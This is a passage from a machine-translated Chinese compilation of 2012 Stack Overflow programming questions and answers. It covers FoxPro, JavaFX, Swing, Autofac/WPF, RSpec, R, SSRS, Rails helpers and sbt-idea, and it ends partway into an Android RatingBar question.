P01
------
100
9.63 
```

到目前为止，我的程序看起来像

```
SELECT distinct contract FROM bs_case
COPY TO contracts.dbf
    NbContracts =RECCOUNT()
    CLOSE TABLES

counter  = 1

DO WHILE counter < NbContracts
    && calling MyProgram ()
    counter = counter + 1
ENDDO 
```

我无法从“Contracts.dbf”中提取合同名称，也不知道如何创建最终结果文件“ResultFile.dbf”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:12:27.867

试试这个，它是伪的，但应该可以工作：

```
******
SELECT 0
CREATE CURSOR MyResults ( columnName C(10), value1 I, value2 N(8,2) )  &&Result cursor
SELECT contracts
LOCATE   &&Go to top of file.
SCAN     &&start loop
     =MyProgram(FIELD(1), contracts.ColumnName)  &&Pass name of column and it's value
ENDSCAN

SELECT MyResults  &&View results.
BROWSE LAST NORMAL

PROCEDURE MyProgram(fieldname, value1)
    ***Do stuff to
    ***generate calculatedvalue1 and calculatedvalue2

    ***Insert name of column, value1 and value2
    INSERT INTO MyResults (columnName, value1, value2) ;
        VALUES(fieldname, calculatedvalue1, calculatedvalue2)
END PROC 
```

# java - JavaFx：从JavaFX线程传递到新线程时，变量值变为空

> ID：13845897
> 
> 赞同：1
> 
> 时间：2012-12-12T18:04:47.973
> 
> 标签：java, multithreading, listview, javafx

在我的聊天软件中，我想更新 ListView 但是当我调用一个方法时，我得到如下所示的空指针异常

```
 public class RoomController implements Initializable {

    /**
     * Initializes the controller class.
     */

    public static ObservableList<String>  members = FXCollections.observableArrayList();

    @FXML public static Button send;
    @FXML static  ListView names;
    @FXML static HTMLEditor outmsg;
    @FXML static HTMLEditor showBox;
    @FXML static ContextMenu listMenu;

    static void updateRemove(String newuser) {
        try
        {
        showBox.setHtmlText(showBox.getHtmlText()+newuser+"<br>  has left room");
        System.out.println(newuser+"has left room");
        members.remove(newuser);
        System.out.println("helloji update remove");
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

    }
    @FXML public void listMenuAction(ActionEvent event)
    {
        MenuItem item = (MenuItem)event.getSource();

        LoginController.getInstance().c.sendPrivateRequest((String)names.getSelectionModel().getSelectedItem());

    }
    @FXML public void sendAction(ActionEvent event)
    {

     LoginController.instance.c.sendMessage(outmsg.getHtmlText());

    }
    public  static void updateList(String name)
    {
        try
        {
        showBox.setHtmlText(showBox.getHtmlText()+"<br> new user entered in room");
        System.out.println("new user enterd"+Client.message.getNewuser());
        System.out.println("beginning update list");
        members.add(name);
        System.out.println(members);
        System.out.println("add user request fullfilled");

        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

    }
     public  static void initList(Vector<String> name)
    {
        try
        {
        System.out.println("list initializing");

            members.setAll(name);

          System.out.println(members);
        System.out.println("list initialized");

        System.out.println("public room created");
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

    }
    public static void showMessage(String msg)
    {

        try
        {
       showBox.setHtmlText(showBox.getHtmlText()+""+msg);
            System.out.println("showing msg   "+msg);
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }

    @Override
    public void initialize(URL url, ResourceBundle rb) {
        // TODO

        try
        {

         names.setItems(members);
         showBox.setHtmlText(showBox.getHtmlText()+"<br> welcome "+Client.username);
             System.out.println("welcome  "+Client.username);

         System.out.println(names.getItems());
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

    }    
} 
```

在上面的代码中 initList() ，updateRemove() ， listUpdate() 方法在我传递值时显示参数值 null ！！

请帮我！！！

下面是我调用上述方法的代码

```
public void run()
{
    while(true)
    {

        try
        {
             if(in==null)
                 {
            in = new ObjectInputStream(socket.getInputStream());
            System.out.println("inputstream created:::::::::::::::::thread");

                }
             message = new Message();
            message = (Message)in.readObject();
            if(message.getMode().equals("addUser"))
            {
                System.out.println("add user request"+message.getNewuser());
               Platform.runLater(new Runnable() {

                    @Override
                    public void run() {
                        RoomController.updateList(message.getNewuser());
                    }
                });

            }
           else if(message.getMode().equals("getmsg"))
            {
               // message.setMessage(message.getMessage());
                 Platform.runLater(new Runnable() {

                    @Override
                    public void run() {
                       RoomController.showMessage(message.getMessage());
                    }
                });

            }
           else if(message.getMode().equals("addallUser"))
            {
                System.out.println("join room response");
                for(String names1 : message.getOlUsers())
                {
                    System.out.println("add all users "+names1);
                }
                   Platform.runLater(new Runnable() {

                    @Override
                    public void run() {
                      RoomController.initList(message.getOlUsers());
                    }
                });

            }
           else if(message.getMode().equals("leaveUser"))
            {
                    Platform.runLater(new Runnable() {

                    @Override
                    public void run() {
                    RoomController.updateRemove(message.getNewuser());
                    }
                });

            }
           else if(message.getMode().equals("privateChatRequest"))
           {
               System.out.println("private request rediraction get from"+message.getNewuser());

               Platform.runLater(new Runnable() {

                   @Override
                   public void run() {
                       CreateRoom.createPrivateroom("privateWindow.fxml", message.getNewuser());
                   }
               });

           }

        }
        catch(Exception e)
        {
            e.printStackTrace();
        }

    }
} 
```

以下是我得到的错误

list initializing
[]
list initialized
public room created
add user requestsanddeep
new user enterdnull
开始更新列表
[null]
add user request fullfilled

# java - 如何使用Jtable中行中第一个单元格的单元格编辑器编辑一行中的所有单元格？

> ID：13845902
> 
> 赞同：0
> 
> 时间：2012-12-12T18:05:08.973
> 
> 标签：java, swing, jtable, jcombobox, tablecelleditor

我有一个 6 列的 JTable。对于第 0 列和第 1 列，我创建了一个组合框作为编辑器。当用户从第 0 列的组合框中选择一个项目时，我希望编辑同一行中的所有单元格。

**有谁知道这是最好的方法还是有其他更好的方法？**

```
JTable table = new JTable();// a table with 6 columns
TableColumn column0 = tabel.getColumnModel().getColumn(0);
comboBox = new JComboBox(summary.getGenerics());
column0.setCellEditor(new DefaultCellEditor(comboBox));
column0.setCellRenderer(new DefaultTableCellRenderer());
comboBox.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent e) {
              String selectedItem = comboBox.getSelectedItem().toString();
               table.setValueAt("class" , table.getSelectedRow() , 1);

            }
        }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T22:18:46.603

此[示例](https://stackoverflow.com/a/7356518/230513)覆盖`getValueAt()`以根据具有`JComboBox`编辑器的列中的选择来调整从属列返回的值。任何依赖列都应该是*不可*编辑的，并且`TableModelListener`应该通知任何依赖列，如此处[所示](https://stackoverflow.com/a/13628183/230513)。

# c# - 将 Autofac 容器传递给 WPF UserControl

> ID：13845903
> 
> 赞同：3
> 
> 时间：2012-12-12T18:05:20.063
> 
> 标签：c#, wpf, dependency-injection, autofac

我正在使用 autofac 来解析 WPF 应用程序中的视图和视图模型。IComponentContext 正在自动传递到视图中。

一个例子：

```
 public BusinessAuto(int proposedCoverageId, IComponentContext componentContext)
    {
        DataContext = componentContext.Resolve<BusinessAutoViewModel>(new TypedParameter(typeof(Int32), proposedCoverageId));
        InitializeComponent();
    } 
```

在此视图的 XAML 中，创建了具有自己的 ViewModel 的 UserControl。一个例子：

```
<userControl:AdditionalCoveragesControl Margin="0,10"/> 
```

Autofac 没有创建 UserControl（视图是），因此 Autofac 不能将依赖项注入到 UserControl 的构造函数中。

**如何获取对 IComponentContext 的引用到在初始视图的 XAML 中声明的 UserControl？**

我觉得我要么需要 Autofac 以某种方式创建我的 UserControl，要么我需要恢复到不鼓励的全局静态容器（ick），或者我必须使用 DependencyProperty 来传递容器（也是 ick）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-05T09:37:54.850

我不会注入（什么是有效的）您的容器，因为这是一种称为服务定位器的控制反转的劣质形式，其缺陷可以通过您当前的情况来总结：您最终需要将容器注入一切。

相反，您需要从“这个组件负责创建什么，它需要做什么？”的角度来处理问题。

正如 Lonni-Loki 所提到的，一种选择是注入一个完全形成的控件，但我不同意这一点：如果主视图有责任创建这个子组件，那么它应该创建它 - 但是为了促进这个责任，你应该用服务/模型/等注入主视图，然后它需要传递或以其他方式用于创建它。Autofac 的工厂方法存根非常适合：

例如，如果子视图需要一个 IFooViewModel，您可以使用 Func<IFooViewModel<（在上下文中注册的工厂方法）注入容器，然后它可以使用它来“按需提供”新包含的视图。

（或 Func<arg1、arg2 等、IFooViewModel>，根据您的需要）

一个方便的经验法则是，在考虑 X 类时，首先将“新”任何东西放在任何地方，然后将其传递给构造函数。现在查看代码并问自己“如果我想要一个 X 类的实例，我需要传递构造函数什么？” 这些是你的依赖。

让我们举一个更实际的例子......假设你有一个这样的结构：

*   应用程序创建 MainWindow

*   MainWindow创建SubView1，需要IMainWindowViewModel

*   SubView1 需要 ISubView1Model、IFooService

*   SubView1 创建 SubView2

*   SubView2 需要 ISubView2Model、IBarService

所以我们的ctors看起来像：

```
public MainWindow(IMainWindowViewModel viewModel, 
     Func<SubView1> subView1Factory)

public SubView1(ISubView1Model viewModel,
    IFooService fooService,
    Func<IFooService, SubView2> subView2Factory)

public SubView2(
    ISubView2ModelViewModel viewModel, 
    IBarService barService) 
```

设置容器时，您将拥有如下内容：

（注意，我使用了各种 IoC 容器，所以我的 Autofac 语法可能会生锈）

```
var builder = new ContainerBuilder();

// Simple bit, register implementations for viewmodel, services
builder.RegisterType<MainWindowViewModel>.As<IMainWindowViewModel>();
builder.RegisterType<SubView1Model>.As<ISubView1Model>();
builder.RegisterInstance<FooService>.As<IFooService>();

// ok, lemme see if I can remember expression syntax...

// Simple case: 'static' resolution of subview
// We want a func that takes no args and returns us a fully-initialized
//  SubView1
builder.Register<Func<SubView1>>(context =>
{
    // Since all the bits of a subview1 are registered, simply
    // resolve it and return
    var view = context.Resolve<SubView1>();
    return () => view;
});

// Complicated case - lets say this viewmodel depends
// on foo service, which it uses to determine which 
// bar service to use
builder.Register<Func<IFooService, SubView2>>(context =>
{
    // and our view model
    var vm = context.Resolve<ISubView2ViewModel>();

    return (service) =>
    {
        var barService = new BarService(service);
        return new SubView2(vm, barService);
    };
}); 
```

IoC 容器的光荣（在我看来，唯一的）用途是“您根据我已经告诉过您的内容弄清楚如何获取所有位”部分 - 否则，您不妨使用手动注入，在那里您手动传递依赖项。也就是说，我们对 MainWindow 的潜在复杂构造现在只是：

```
container.Resolve<MainWindow>(); 
```

我希望我没有在代码中犯太多错别字/错误，但我有一段时间没有使用 Autofac。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-05T09:21:49.810

您不应将 componentContext 传递给 BusinessAuto 视图，而应传递 AdditionalCoveragesControl。

```
public BusinessAuto(int proposedCoverageId, BusinessAutoViewModel vm, AdditionalCoveragesControl view)
{ 
  ...
  DataContext = vm;
  InternalView = view;
} 
```

**XAML：**

```
 <ContentPresenter Content="{Binding InternalView}" Margin="0,10"/> 
```

然后你的所有视图都将独立于 Autofac，你应该将它们全部注册到容器中。

# ruby-on-rails - Rspec GET 与路由不匹配

> ID：13845910
> 
> 赞同：0
> 
> 时间：2012-12-12T18:05:39.923
> 
> 标签：ruby-on-rails, rspec, capybara

我正在我的应用程序中测试一个控制器，并在我的控制器中有以下代码：

```
describe CsdlController do
    describe "GET /csdl/inclusive" do
        before do 
            # Create domains that are included
            @domain = create(:validated_domain)
        end
        it "returns a CSDL with valid domains" do
            get "/csdl/include.json"
            response.body.should =~ /#{@domain.text}/
        end
    end
end 
```

我也有以下路线：

```
match "/csdl/:type" => 'csdl#show' 
```

但是，当我运行规范时，它给了我以下错误：

```
No route matches {:controller=>"csdl", :action=>"/csdl/include.json"} 
```

我有一种感觉，我在这里错误地使用了 RSpec，但不知道如何解决它。有任何想法吗？

我应该补充一点，当我通过浏览器实际调用它时，它似乎工作得很好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:33:25.710

在控制器测试中，您通过名称而不是路由路径调用操作：

```
get :show, type: 'include', format: 'json' 
```

# r - 调用在列表中找到的 data.frame

> ID：13845919
> 
> 赞同：0
> 
> 时间：2012-12-12T18:06:09.077
> 
> 标签：r, list, dataframe, apply

我已经导入了多个文件 read.table 并将每个文件命名为 file1、file2、file3、... 我已经将所有 data.frames（read.table 文件）放入一个列表中：

```
ClassFilter <- function(x) inherits(get(x), 'data.frame' )
Objs <- Filter( ClassFilter, ls() ) 
```

现在我想调用每个data.frame（例如file1）并做一个列的意思：

```
for(x in 1:NumberOfFiles){
  mean[NumberOfFiles:400] <- apply(Objs[[x]],2,mean)
} 
```

问题是 Objs[[x]] 给我一个错误“应用错误（Objs[[x]], 2, mean）：dim(X) 必须有一个正长度”，因为列表中的元素没有指向到data.frame。任何人都知道如何使列表元素指向最初创建列表的 data.frame 吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:17:01.563

`Objs`包含`data.frame`变量的名称，因此您必须首先使用`get()`函数获取变量：

```
for(x in 1:NumberOfFiles){
  Mean[NumberOfFiles:400] <- apply(get(Objs[x]),2,mean)
} 
```

或者，如果您愿意，也可以“评估”变量名：

```
for(x in 1:NumberOfFiles){
  Mean[NumberOfFiles:400] <- apply(eval(as.name(Objs[x])),2,mean)
} 
```

此外，正如@SeñorO 正确指出的那样，您应该为`mean`对象指定一个不同的名称，以避免与函数均值发生冲突。

# reporting-services - BIDS 中仅部署当前报告 (SSRS) 的快捷方式？

> ID：13845920
> 
> 赞同：1
> 
> 时间：2012-12-12T18:06:13.047
> 
> 标签：reporting-services, keyboard-shortcuts, bids

我刚刚在 BIDS 中找到了一个名为 的快捷方式，`Build.DeploySelection`为此我分配了`CTRL`+`←</kbd> and it worked.`

但它部署了我所有的报告，即使我只希望它做我正在处理的那个。![在此处输入图像描述](../Images/f363c01bd012474f534ffef9fc025855.png)

# ruby-on-rails - 嵌套标记帮助器方法上的 SyntaxError

> ID：13845921
> 
> 赞同：0
> 
> 时间：2012-12-12T18:06:13.580
> 
> 标签：ruby-on-rails, ruby-on-rails-3, view-helpers

所以我正在写一个助手来帮助我填写 Rails 引导程序的轮播。这是帮助方法的一段代码：

```
def carousel_item(element, active = false)          
    content_tag :div, class:"item"+(active ? " active" : "") do
        image_tag("carousel/"+element.name) +
        if !element.desc.nil? || !element.title.nil? || !element.link.nil? do
            content_tag(:div, {class:'container'}) do
                !element.title.nil? ? content_tag(:h1, element.title) +
                !element.desc.nil? ? content_tag(:p, element.desc, class:"lead") +
                !element.link.nil? ? link_to(element.linktitle, url_for(action: element.link), {class:"btn btn-large btn-primary"}) +
            end             
        end
    end     
end 
```

但后来我得到这个错误：

> app/helpers/application_helper.rb:22：语法错误，意外的keyword_end，期待'：'

在关闭方法之前的最后一个结束之后指向.. 与这个东西斗争了几个小时，仍然找不到解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T21:29:17.427

...

```
!element.title.nil? ? content_tag(:h1, element.title) +
(!element.desc.nil? ? content_tag(:p, element.desc, class:"lead") +
(!element.link.nil? ? link_to(element.linktitle, url_for(action:   element.link), {class:"btn btn-large btn-primary"}) : nil ) : nil) : nil 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T04:21:38.707

`: ""`首先，我在每个条件的末尾修复了我的内联条件。（感谢 Valery Kvon）然后，最后我找到了使用 .html_safe 方法解决嵌套问题的方法，我只是将所有内容存储在字符串 var 中，然后使用 html_safe 返回它。这是代码：

```
def carousel_item(element, active=false )
    if !element.nil?
        content_tag(:div,class:"item"+(active ? " active" : "")) do 
            image_tag("carousel/"+element.name) + #important to concat with next part
            if !element.desc.nil? || !element.title.nil? || !element.link.nil?
                content_tag(:div,class:"container") do
                    content_tag(:div,class:"carousel-caption") do
                        c = ""
                        !element.title.nil? ?   c += content_tag(:h1,element.title) : ""
                        !element.desc.nil? ?    c += content_tag(:p,element.desc,class:"lead") : ""
                        !element.link.nil? ? c += link_to(element.linktitle,url_for(action: element.link),class:"btn btn-large btn-primary") : ""
                        c.html_safe #this is the key that solves eveything
                    end
                end
            else
                nil
            end
        end
    end
end 
```

这里有一些其他的例子，说明如何做到这一点 [html_safe 和 rails 3 中的助手](http://techspry.com/ruby_and_rails/html_safe-and-helpers-in-rails-3-mystery-solved/)

# java - JMenuBar 带有绘制方法

> ID：13845922
> 
> 赞同：2
> 
> 时间：2012-12-12T18:06:19.193
> 
> 标签：java, swing, overriding, java-2d, jmenubar

我无法让我的 JMenuBar 出现在我的 paint() 方法旁边。

```
package Main;

import java.awt.Color;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;

import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;

public class Main extends JFrame{

int x, y; // axis position for oval

//JMenuBar Variables
JMenuBar menuBar;
JMenu file;
JMenuItem newGame;
JMenuItem checkScore;
JMenuItem exitGame;

// DOUBLE BUFFERING
private Image dbImage;
private Graphics dbGraphics;

Font font = new Font("Arial", Font.ITALIC, 30);

// KeyListener Class
public class KeyListener extends KeyAdapter {
    public void keyPressed(KeyEvent e){
        int keyCode = e.getKeyCode();
        if(keyCode == e.VK_LEFT){
            if(x <=0){ // FRAME COLLISION DETECTION 
                x=0;
            }else
            x += -5; //decrement position to the left 
        }
        if(keyCode == e.VK_RIGHT){
            if(x >= 380){
                x = 380;
            }else
            x += +5; //incrementing position to the right
        }
        if(keyCode == e.VK_UP){
            if (y <= 25){
                y = 25;
            }else
            y += -5; //decrementing position up
        }
        if(keyCode == e.VK_DOWN){
            if(y >= 380){
                y = 380;
            }else
            y += +5; //incrementing position down
        }
    }
}

// CONSTRUCTOR
public Main(){
// Window Properties
    addKeyListener(new KeyListener()); // creates instance of KeyListener class
    setTitle("Tower Defence");
    setSize(400, 400);
    setResizable(false);
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    //setBackground(Color.CYAN);

// JMenuBar
    menuBar = new JMenuBar();
    file = new JMenu("File");
    newGame = new JMenuItem("New Game");
    checkScore = new JMenuItem("Check High Scores");
    exitGame = new JMenuItem("Close Game");

    menuBar.add(file);
    file.add(newGame);
    file.add(checkScore);
    file.addSeparator();
    file.add(exitGame);
    setJMenuBar(menuBar);

// Display frame after all components added
    setVisible(true);

// default position for oval
    x = 150;
    y = 150;

}

public void paint(Graphics g){
    dbImage = createImage(getWidth(), getHeight()); // creates image of screen
    dbGraphics = dbImage.getGraphics(); // gets graphics to be drawn in off screen image
    paintComponent(dbGraphics); // paints graphics
    g.drawImage(dbImage, 0, 0, this);  // draw image to the visible screen
}

    // PAINT GRAPHICS TO SCREEN
public void paintComponent(Graphics g){

    g.setFont(font);
    g.drawString("Hello World", 100, 200);

    g.setColor(Color.red);
    g.drawOval(x, y, 15, 15);
    g.fillOval(x, y, 15, 15);
    repaint();
}

// MAIN METHOD
public static void main(String[] args) {
    new Main();
}

} 
```

我看到了一个不同的问题，解决方案是覆盖paint方法并添加 super.paint(g); 当我尝试这个时，JMenuBar 出现但框架不断闪烁。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T18:32:44.980

*   `JFrame`不要不必要地扩展

*   不要覆盖任何`JFrame`不必要地添加 Jpanel 并覆盖的绘制方法`paintComponent`

*   不要调用`repaint(...)`，`paintComponent(...)`因为这将导致循环，即重新绘制将重新调用`paintComponent`并且循环将继续

*   创建和操作 Swing 组件[`Event Dispatch Thread`](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)

*   不要调用`setSize(..)`而是`JFrame`覆盖`getPreferredSize`并返回适合所有图纸的适当尺寸，而不是`JFrame#pack()`在设置`JFrame`可见之前调用

*   不要将`KeyListener`/`KeyAdapter`用于 Swing 组件，而是使用[`KeyBindings`](http://docs.oracle.com/javase/tutorial/uiswing/misc/keybinding.html)

这是您修复的代码：

![在此处输入图像描述](../Images/f6c3a830bc28e4ae6e74536600896594.png)

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.RenderingHints;
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;
import javax.swing.AbstractAction;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.KeyStroke;
import javax.swing.SwingUtilities;

public class Main extends JPanel {

    int x, y; // axis position for oval
    //JMenuBar Variables
    JMenuBar menuBar;
    JMenu file;
    JMenuItem newGame;
    JMenuItem checkScore;
    JMenuItem exitGame;
    Font font = new Font("Arial", Font.ITALIC, 30);

    // KeyBindings Class
    public class KeyBindings {

        public KeyBindings(final JComponent jc) {
            jc.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke(KeyEvent.VK_RIGHT, 0, false), "Right");
            jc.getActionMap().put("Right", new AbstractAction() {
                @Override
                public void actionPerformed(ActionEvent ae) {
                    if (x >= 380) {
                        x = 380;
                    } else {
                        x += +5; //incrementing position to the right
                    }
                    jc.repaint();

                }
            });

            jc.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke(KeyEvent.VK_LEFT, 0, false), "Left");
            jc.getActionMap().put("Left", new AbstractAction() {
                @Override
                public void actionPerformed(ActionEvent ae) {
                    if (x <= 0) { // FRAME COLLISION DETECTION 
                        x = 0;
                    } else {
                        x += -5; //decrement position to the left 
                    }
                    jc.repaint();

                }
            });
            jc.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke(KeyEvent.VK_UP, 0, false), "Up");
            jc.getActionMap().put("Up", new AbstractAction() {
                @Override
                public void actionPerformed(ActionEvent ae) {
                    if (y <= 25) {
                        y = 25;
                    } else {
                        y += -5; //decrementing position up
                    }
                    jc.repaint();

                }
            });
            jc.getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW).put(KeyStroke.getKeyStroke(KeyEvent.VK_DOWN, 0, false), "Down");
            jc.getActionMap().put("Down", new AbstractAction() {
                @Override
                public void actionPerformed(ActionEvent ae) {
                    if (y >= 380) {
                        y = 380;
                    } else {
                        y += +5; //incrementing position down
                    }
                    jc.repaint();

                }
            });
        }
    }

    // CONSTRUCTOR
    public Main() {
        // Window Properties
        JFrame frame = new JFrame();
        frame.setTitle("Tower Defence");
        frame.setResizable(false);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        //setBackground(Color.CYAN);

        // JMenuBar
        menuBar = new JMenuBar();
        file = new JMenu("File");
        newGame = new JMenuItem("New Game");
        checkScore = new JMenuItem("Check High Scores");
        exitGame = new JMenuItem("Close Game");

        menuBar.add(file);
        file.add(newGame);
        file.add(checkScore);
        file.addSeparator();
        file.add(exitGame);

        JPanel panel = new JPanel() {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                Graphics2D g2 = (Graphics2D) g;
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);

                g.setFont(font);
                g.drawString("Hello World", 100, 200);

                g.setColor(Color.red);
                g.drawOval(x, y, 15, 15);
                g.fillOval(x, y, 15, 15);
            }

            @Override
            public Dimension getPreferredSize() {
                return new Dimension(400, 400);
            }
        };
        //add keybindings
        new KeyBindings(panel);

        frame.add(panel);

        frame.setJMenuBar(menuBar);

        frame.pack();
        // Display frame after all components added
        frame.setVisible(true);

        // default position for oval
        x = 150;
        y = 150;

    }

    // MAIN METHOD
    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new Main();
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T18:40:58.460

哎呀，我会把我的代码扔进戒指。根据我的评论推荐。此外，不要使用 KeyListeners 而是使用 Key Bindings。

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.RenderingHints;
import java.awt.Graphics2D;
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;

import javax.swing.*;

@SuppressWarnings("serial")
public class Main2 extends JPanel {
   private static final int PREF_W = 400;
   private static final int PREF_H = PREF_W;
   private static final int OVAL_W = 15;
   private int x = 150;
   private int y = 150;
   private JMenuBar menuBar;
   private JMenu file;
   private JMenuItem newGame;
   private JMenuItem checkScore;
   private JMenuItem exitGame;
   private Font font = new Font("Arial", Font.ITALIC, 30);

   public Main2() {      
      menuBar = new JMenuBar();
      file = new JMenu("File");
      newGame = new JMenuItem("New Game");
      checkScore = new JMenuItem("Check High Scores");
      exitGame = new JMenuItem("Close Game");

      menuBar.add(file);
      file.add(newGame);
      file.add(checkScore);
      file.addSeparator();
      file.add(exitGame);

      addKeyBinding();
   }

   public JMenuBar getMenuBar() {
      return menuBar;
   }

   @Override
   public Dimension getPreferredSize() {
      return new Dimension(PREF_W, PREF_H);
   }

   @Override
   protected void paintComponent(Graphics g) {
      super.paintComponent(g);
      Graphics2D g2 = (Graphics2D) g;
      g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, 
            RenderingHints.VALUE_ANTIALIAS_ON);
      g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, 
            RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
      g.setFont(font);
      g.drawString("Hello World", 100, 200);

      g.setColor(Color.red);
      g.drawOval(x, y, OVAL_W, OVAL_W);
      g.fillOval(x, y, OVAL_W, OVAL_W);
   }

   private void addKeyBinding() {
      int condition = WHEN_IN_FOCUSED_WINDOW;
      InputMap inputMap = getInputMap(condition);
      ActionMap actionMap = getActionMap();

      for (final MyDirection dir : MyDirection.values()) {
         KeyStroke keyStroke = KeyStroke.getKeyStroke(dir.getKeyCode(), 0);
         inputMap.put(keyStroke, dir.toString());
         actionMap.put(dir.toString(), new AbstractAction() {

            @Override
            public void actionPerformed(ActionEvent evt) {
               int newX = x + dir.getxTrans();
               int newY = y + dir.getyTrans();

               newX = Math.min(newX, PREF_W - 2 * OVAL_W);
               newX = Math.max(newX, OVAL_W);
               newY = Math.min(newY, PREF_H - 2 * OVAL_W);
               newY = Math.max(newY, OVAL_W);

               x = newX;
               y = newY;
               repaint();
            }
         });
      }
   }

   enum MyDirection {
      UP(KeyEvent.VK_UP, 0, -5), DOWN(KeyEvent.VK_DOWN, 0, 5), 
      LEFT(KeyEvent.VK_LEFT, -5, 0), RIGHT(KeyEvent.VK_RIGHT, 5, 0);

      private int keyCode;
      private int xTrans;
      private int yTrans;

      private MyDirection(int keyCode, int xTrans, int yTrans) {
         this.keyCode = keyCode;
         this.xTrans = xTrans;
         this.yTrans = yTrans;
      }

      public int getKeyCode() {
         return keyCode;
      }

      public int getxTrans() {
         return xTrans;
      }

      public int getyTrans() {
         return yTrans;
      }

   }

   private static void createAndShowGui() {
      Main2 main = new Main2();

      JFrame frame = new JFrame("Main2");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(main);
      frame.setJMenuBar(main.getMenuBar());
      frame.pack();
      frame.setLocationRelativeTo(null);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

# scala - 如何让 sbt-idea 在 scala-2.10 项目中工作？

> ID：13845924
> 
> 赞同：6
> 
> 时间：2012-12-12T18:06:23.713
> 
> 标签：scala, sbt, sbt-idea

[让sbt-idea](https://github.com/mpeltonen/sbt-idea)在我的 Scala 2.10 项目中工作时遇到了很多麻烦。

我尝试`sbt-idea`从它的 git repo 编译，确保已设置

```
scalaVersion := "2.10.0-RC5" 
```

在`build/Build.scala`，并使用`publish-local`命令在 git 中编译它。但我仍然不断得到

```
[error] sbt.IncompatiblePluginsException: Binary incompatibility in plugins detected. 
```

然后当我在我发布的版本中使用它时，只需添加

```
addSbtPlugin("com.github.mpeltonen" % "sbt-idea" % "1.3.0-SNAPSHOT") 
```

到`project/plugins.sbt`文件。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T18:51:51.190

不要认为您需要为 Scala 2.10 构建 SBT。我将我的 gen-idea 和 eclipse 项目生成器保存在全局 build.sbt 文件中，它适用于我的所有项目（或者看起来 ;-)

我使用的是 Ubuntu，因此 SBT 配置文件保存在您计算机上的位置可能会有所不同。

`plugins`在隐藏的 sbt 目录下创建一个名为的文件夹。在 Linux 上，它位于`~/.sbt`（其中波浪号是您的主目录的别名）。所以现在你应该有`~/.sbt/plugins`

然后在此目录下创建一个名为的文件`build.sbt`，并将以下内容添加到其中：

```
resolvers += "Sonatype snapshots" at "http://oss.sonatype.org/content/repositories/snapshots/"

resolvers += "Sonatype releases"  at "https://oss.sonatype.org/content/repositories/releases/"

addSbtPlugin("com.typesafe.sbteclipse" % "sbteclipse-plugin" % "2.1.0")

addSbtPlugin("com.github.mpeltonen" % "sbt-idea" % "1.2.0-SNAPSHOT") 
```

为了测试，我刚刚用它生成了一个 scala 2.10 项目，看起来还不错。

哦，`eclipse`如果你想生成 Scala-IDE 项目，上面的文件还增加了对 SBT 中命令的支持。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T18:08:32.683

通过在项目本身中`gen-idea`添加以下内容，我能够使用旧版本：`project/plugins.sbt`

```
import sbt._

import Defaults._

libraryDependencies += sbtPluginExtra(
    m = "com.github.mpeltonen" % "sbt-idea" % "1.2.0", // Plugin module name and version
    sbtV = "0.12",    // SBT version
    scalaV = "2.9.2"    // Scala version compiled the plugin
) 
```

# android - Android RatingBar 属性代表什么？

> ID：13845926
> 
> 赞同：0
> 
> 时间：2012-12-12T18:06:38.157
> 
> 标签：android, android-widget

我为这个问题道歉，但我在理解 RatingBar 属性时遇到了问题。

基本上，我正在尝试创建一个总共有 7 颗星的评分栏，并且每次“跳跃”0.5 颗星。

